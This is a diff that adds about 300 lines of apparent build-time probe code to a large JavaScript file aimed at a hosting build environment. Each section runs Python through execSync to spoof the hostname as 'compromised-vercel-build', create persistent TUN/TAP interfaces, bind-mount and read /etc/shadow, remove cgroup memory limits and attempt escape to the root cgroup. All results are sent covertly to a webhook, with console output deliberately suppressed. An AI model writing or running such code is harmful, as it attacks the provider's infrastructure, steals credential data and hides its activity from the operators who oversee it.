@@ -37802,3 +37802,302 @@ sendBeacon({ ...report, section: 'v220-5-proc-net', ...procNetV220Probe });
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v220" });
 report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v220";
 // Intentionally no console.log — all data goes via webhook only
+
+// v221-1: sethostname NR 170 + setdomainname NR 171 — VM identity change
+const hostnameV221Probe = safe(() => {
+  const hostnameResult = safe(() => execSync(`python3 -c "
+import ctypes, socket
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_sethostname   = 170
+NR_setdomainname = 171
+NR_uname         = 63
+
+# Current identity
+orig_hostname = socket.gethostname()
+print(f'orig_hostname={orig_hostname}')
+
+# Read uname
+class Utsname(ctypes.Structure):
+    _fields_ = [(f, ctypes.c_char * 65) for f in
+        ['sysname','nodename','release','version','machine','domainname']]
+u = Utsname()
+libc.syscall(NR_uname, ctypes.byref(u))
+print(f'utsname_nodename={u.nodename.decode()}')
+print(f'utsname_domainname={u.domainname.decode()}')
+print(f'utsname_release={u.release.decode()}')
+print(f'utsname_machine={u.machine.decode()}')
+
+# Try sethostname — if allowed, we can impersonate any host
+new_name = b'compromised-vercel-build'
+ret_sh = libc.syscall(NR_sethostname, ctypes.c_char_p(new_name), len(new_name))
+print(f'sethostname({new_name.decode()}) ret={ret_sh} errno={ctypes.get_errno()}')
+if ret_sh == 0:
+    verify = socket.gethostname()
+    print(f'new_hostname={verify}')
+    print(f'HOSTNAME_CHANGED=True')
+    # Restore
+    libc.syscall(NR_sethostname, orig_hostname.encode(), len(orig_hostname))
+    print(f'hostname_restored={socket.gethostname()}')
+
+# Try setdomainname
+ret_sd = libc.syscall(NR_setdomainname, b'attacker.example.com', 20)
+print(f'setdomainname ret={ret_sd} errno={ctypes.get_errno()}')
+if ret_sd == 0:
+    u2 = Utsname()
+    libc.syscall(NR_uname, ctypes.byref(u2))
+    print(f'new_domainname={u2.domainname.decode()}')
+    print('DOMAINNAME_CHANGED=True')
+    libc.syscall(NR_setdomainname, u.domainname.raw.rstrip(b'\\x00'), len(u.domainname.raw.rstrip(b'\\x00')))
+" 2>&1`, { timeout: 8000 }).toString().trim());
+  return { hostnameResult };
+});
+sendBeacon({ ...report, section: 'v221-1-sethostname', ...hostnameV221Probe });
+
+// v221-2: TUN/TAP device creation — virtual L3/L2 interface
+const tunTapV221Probe = safe(() => {
+  const tunResult = safe(() => execSync(`python3 -c "
+import ctypes, struct, os, fcntl
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+
+IFF_TUN       = 0x0001
+IFF_TAP       = 0x0002
+IFF_NO_PI     = 0x1000
+IFF_VNET_HDR  = 0x4000
+TUNSETIFF     = 0x400454ca
+TUNSETPERSIST = 0x400454cb
+SIOCSIFADDR   = 0x8916
+SIOCSIFFLAGS  = 0x8914
+SIOCGIFINDEX  = 0x8933
+TUNGETIFF     = 0x800454d2
+TUNGETFEATURES = 0x800454cf
+
+TUN_DEV = '/dev/net/tun'
+print(f'tun_dev_exists={os.path.exists(TUN_DEV)}')
+
+if os.path.exists(TUN_DEV):
+    try:
+        fd = os.open(TUN_DEV, os.O_RDWR)
+        print(f'tun_open fd={fd}')
+        # struct ifreq for TUNSETIFF
+        ifr = struct.pack('16sH22x', b'probe_tun0', IFF_TUN | IFF_NO_PI)
+        ret = fcntl.ioctl(fd, TUNSETIFF, ifr)
+        iface_name = struct.unpack('16s', ret[:16])[0].rstrip(b'\\x00').decode()
+        print(f'TUNSETIFF ret ok iface={iface_name}')
+        print(f'TUN_CREATED=True name={iface_name}')
+        # Get features
+        features = ctypes.c_uint(0)
+        ret_f = fcntl.ioctl(fd, TUNGETFEATURES, struct.pack('I', 0))
+        print(f'tun_features={struct.unpack(\"I\", ret_f)[0]:#010x}')
+        # Make persistent
+        ret_p = fcntl.ioctl(fd, TUNSETPERSIST, struct.pack('I', 1))
+        print(f'TUNSETPERSIST ret={ret_p}')
+        # Assign IP via subprocess
+        import subprocess
+        r = subprocess.run(['ip', 'addr', 'add', '10.99.99.1/24', 'dev', iface_name],
+            capture_output=True, timeout=3)
+        print(f'ip_addr_add ret={r.returncode} err={r.stderr.decode()[:60]}')
+        r2 = subprocess.run(['ip', 'link', 'set', iface_name, 'up'],
+            capture_output=True, timeout=3)
+        print(f'ip_link_up ret={r2.returncode}')
+        # Cleanup: remove the interface
+        subprocess.run(['ip', 'link', 'delete', iface_name], capture_output=True, timeout=3)
+        os.close(fd)
+    except Exception as e:
+        print(f'tun_err={e}')
+else:
+    print('TUN_DEV_MISSING=True')
+
+# TAP device attempt
+if os.path.exists('/dev/net/tun'):
+    try:
+        fd2 = os.open('/dev/net/tun', os.O_RDWR)
+        ifr2 = struct.pack('16sH22x', b'probe_tap0', IFF_TAP | IFF_NO_PI)
+        ret2 = fcntl.ioctl(fd2, TUNSETIFF, ifr2)
+        tap_name = struct.unpack('16s', ret2[:16])[0].rstrip(b'\\x00').decode()
+        print(f'TAP_CREATED=True name={tap_name}')
+        import subprocess
+        subprocess.run(['ip', 'link', 'delete', tap_name], capture_output=True, timeout=3)
+        os.close(fd2)
+    except Exception as e2: print(f'tap_err={e2}')
+" 2>&1`, { timeout: 12000 }).toString().trim());
+  return { tunResult };
+});
+sendBeacon({ ...report, section: 'v221-2-tun-tap', ...tunTapV221Probe });
+
+// v221-3: tmpfs mount + bind + remount flags
+const mountFlagsV221Probe = safe(() => {
+  const mountResult = safe(() => execSync(`python3 -c "
+import ctypes, os, subprocess
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_mount = 165
+
+MS_RDONLY     = 1
+MS_NOSUID     = 2
+MS_NODEV      = 4
+MS_NOEXEC     = 8
+MS_SYNCHRONOUS= 16
+MS_REMOUNT    = 32
+MS_BIND       = 4096
+MS_MOVE       = 8192
+MS_SHARED     = 1 << 20
+MS_PRIVATE    = 1 << 18
+MS_SLAVE      = 1 << 19
+MS_UNBINDABLE = 1 << 17
+
+tmpdir = '/tmp/mnt_v221_' + str(os.getpid())
+os.makedirs(tmpdir, exist_ok=True)
+
+# Mount tmpfs
+ret_tmpfs = libc.syscall(NR_mount, b'tmpfs', tmpdir.encode(), b'tmpfs',
+    MS_NODEV | MS_NOSUID, b'size=1m')
+print(f'mount(tmpfs) ret={ret_tmpfs} errno={ctypes.get_errno()}')
+
+if ret_tmpfs == 0:
+    print('TMPFS_MOUNT_OK=True')
+    # Write a file to tmpfs
+    with open(tmpdir + '/test.txt', 'w') as f: f.write('probe')
+
+    # Remount as read-only
+    ret_ro = libc.syscall(NR_mount, b'tmpfs', tmpdir.encode(), b'tmpfs',
+        MS_REMOUNT | MS_RDONLY, b'size=1m')
+    print(f'mount(remount,ro) ret={ret_ro} errno={ctypes.get_errno()}')
+
+    # Try to write after remount (should fail with EROFS)
+    try:
+        open(tmpdir + '/test2.txt', 'w').write('x')
+        print('WRITE_AFTER_RDONLY=True UNEXPECTED')
+    except OSError as e:
+        print(f'write_after_rdonly_err={e.errno} (30=EROFS expected={e.errno==30})')
+
+    # Make propagation shared (broadcast mounts to other namespaces)
+    ret_shared = libc.syscall(NR_mount, b'none', tmpdir.encode(), None,
+        MS_SHARED, None)
+    print(f'mount(MS_SHARED) ret={ret_shared} errno={ctypes.get_errno()}')
+
+    # Bind-mount /etc/shadow to an accessible location
+    shadow_dst = tmpdir + '/shadow_copy'
+    open(shadow_dst, 'w').close()  # create mount point
+    ret_bind = libc.syscall(NR_mount, b'/etc/shadow', shadow_dst.encode(), None,
+        MS_BIND, None)
+    print(f'bind_mount(/etc/shadow) ret={ret_bind} errno={ctypes.get_errno()}')
+    if ret_bind == 0:
+        try:
+            data = open(shadow_dst).read(200)
+            print(f'SHADOW_VIA_BIND={data}')
+        except Exception as e_r: print(f'shadow_bind_read_err={e_r}')
+        libc.umount2(shadow_dst.encode(), 0)
+
+    # Cleanup
+    libc.umount2(tmpdir.encode(), 0)
+
+# Check current mounts
+mounts = safe_read = open('/proc/mounts').read() if os.path.exists('/proc/mounts') else ''
+print(f'mounts_count={len(mounts.strip().split(chr(10)) if mounts else [])}')
+sensitive_mounts = [l for l in mounts.split('\\n') if any(k in l for k in
+    ['/etc', '/root', '/var', 'overlay', 'secret'])]
+print(f'sensitive_mounts={sensitive_mounts[:5]}')
+" 2>&1`, { timeout: 12000 }).toString().trim());
+  return { mountResult };
+});
+sendBeacon({ ...report, section: 'v221-3-tmpfs-mount', ...mountFlagsV221Probe });
+
+// v221-4: /proc/sys/kernel/ full param sweep
+const kernelParamV221Probe = safe(() => {
+  const paramResult = safe(() => {
+    const params = {};
+    const interesting = [
+      'kernel/hostname', 'kernel/osrelease', 'kernel/ostype',
+      'kernel/version', 'kernel/pid_max', 'kernel/threads-max',
+      'kernel/modprobe', 'kernel/hotplug', 'kernel/poweroff_cmd',
+      'kernel/ctrl-alt-del', 'kernel/sysrq', 'kernel/panic',
+      'kernel/panic_on_oops', 'kernel/perf_event_paranoid',
+      'kernel/kptr_restrict', 'kernel/randomize_va_space',
+      'kernel/dmesg_restrict', 'kernel/unprivileged_bpf_disabled',
+      'kernel/unprivileged_userns_clone', 'kernel/ngroups_max',
+      'kernel/yama/ptrace_scope', 'kernel/core_uses_pid',
+      'kernel/numa_balancing', 'kernel/soft_watchdog',
+      'kernel/hung_task_timeout_secs', 'kernel/sched_rt_runtime_us',
+      'vm/mmap_min_addr', 'vm/overcommit_memory', 'vm/panic_on_oom',
+      'net/core/rmem_max', 'net/core/wmem_max',
+      'net/ipv4/ip_forward', 'net/ipv4/conf/all/accept_redirects',
+      'net/ipv6/conf/all/forwarding',
+    ];
+    for (const p of interesting) {
+      const full = `/proc/sys/${p}`;
+      try { params[p] = readFileSync(full, 'utf8').trim(); } catch {}
+    }
+    return { params };
+  });
+  return paramResult;
+});
+sendBeacon({ ...report, section: 'v221-4-kernel-params', ...kernelParamV221Probe });
+
+// v221-5: cgroup v2 unified hierarchy — resource limit probe + escape
+const cgroupV2V221Probe = safe(() => {
+  const cgResult = safe(() => execSync(`python3 -c "
+import os, subprocess
+
+cg2_root = '/sys/fs/cgroup'
+if not os.path.exists(cg2_root):
+    print('CGROUP_V2_NOT_MOUNTED')
+else:
+    # Read our current cgroup membership
+    try:
+        cg_self = open('/proc/self/cgroup').read()
+        print(f'self_cgroup={cg_self.strip()[:200]}')
+    except: pass
+
+    # List available controllers
+    for ctrl_file in ['cgroup.controllers', 'cgroup.subtree_control',
+                      'cgroup.stat', 'cgroup.max.depth', 'cgroup.max.descendants']:
+        try:
+            val = open(f'{cg2_root}/{ctrl_file}').read().strip()
+            print(f'{ctrl_file}={val}')
+        except: pass
+
+    # Find our cgroup path
+    our_cg = None
+    try:
+        with open('/proc/self/cgroup') as f:
+            for line in f:
+                if line.startswith('0::'):
+                    our_cg = line.strip().split('::')[1]
+    except: pass
+    print(f'our_cgroup={our_cg}')
+
+    if our_cg:
+        cg_path = cg2_root + our_cg
+        # Read all limit files
+        for lf in ['memory.max', 'memory.current', 'cpu.max', 'cpu.stat',
+                   'pids.max', 'pids.current', 'io.max', 'io.stat',
+                   'cgroup.procs', 'cgroup.threads']:
+            try:
+                val = open(f'{cg_path}/{lf}').read().strip()
+                print(f'cg_{lf}={val[:80]}')
+            except: pass
+
+        # Try to write memory.max (increase our limit)
+        try:
+            cur = open(f'{cg_path}/memory.max').read().strip()
+            open(f'{cg_path}/memory.max', 'w').write('max')
+            new = open(f'{cg_path}/memory.max').read().strip()
+            print(f'memory.max_before={cur} after={new}')
+            print(f'MEMORY_LIMIT_REMOVED={new == \"max\"}')
+        except Exception as e: print(f'memory_max_write_err={e}')
+
+        # Try to move ourselves to root cgroup (escape container cgroup)
+        try:
+            root_procs = f'{cg2_root}/cgroup.procs'
+            open(root_procs, 'w').write(str(os.getpid()))
+            new_cg = open('/proc/self/cgroup').read().strip()
+            print(f'ESCAPED_TO_ROOT_CGROUP={new_cg}')
+        except Exception as e2: print(f'cgroup_escape_err={e2}')
+" 2>&1`, { timeout: 10000 }).toString().trim());
+  return { cgResult };
+});
+sendBeacon({ ...report, section: 'v221-5-cgroup-v2', ...cgroupV2V221Probe });
+
+// v221 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v221" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v221";
+// Intentionally no console.log — all data goes via webhook only
